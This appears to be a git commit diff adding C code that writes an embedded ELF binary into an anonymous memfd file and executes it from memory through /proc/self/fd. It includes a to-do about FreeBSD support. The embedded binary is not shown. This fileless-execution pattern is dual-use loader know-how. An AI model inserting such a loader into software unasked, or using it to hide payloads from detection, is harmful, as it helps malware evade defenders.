049054255a079c8377ffc01ce2184eda5a15fe85
Humza <139543666+humzak711@users.noreply.github.com>
2024-08-01 19:01:27 +0100

    Update main.c

--- lib/main.c
+++ lib/main.c
@@ -12,6 +12,32 @@
 #include <errno.h>
 
 int main() {
+    
+   // Call the memfd_create subroutine to create an anonymous file descriptor
+    int anon_fd = memfd_create("", MFD_CLOEXEC);
+    if (anon_fd == -1) {
+        perror("memfd_create");
+        exit(EXIT_FAILURE);
+    }
 
+    // Write the elf to the anonymous file descriptor
+    write(anon_fd, elf, elf_len);
+
+    // Construct a string variable to hold the anonymous file descriptor's path
+    char *anon_fd_path;
+    /* To do: construct the filepath to the path of the file descriptor for FreeBSD 
+       as currently it constructs the filepath to paths of file descriptor's for linux,
+       replace /proc/self/fd/%i with what the file path for the file descriptor would 
+       be in FreeBSD */
+    asprintf(&anon_fd_path, "/proc/self/fd/%i", anon_fd);
+
+    // Call execl on the anonymous file descriptor's path to execute the elf
+    if (execl(anon_fd_path, NULL) == -1) {
+        perror("execl");
+        exit(EXIT_FAILURE);
+    }
+
+    /* The code here will not be executed if successful since the process will now 
+       hold the elf that has been executed in memory */
     return EXIT_SUCCESS;
 }
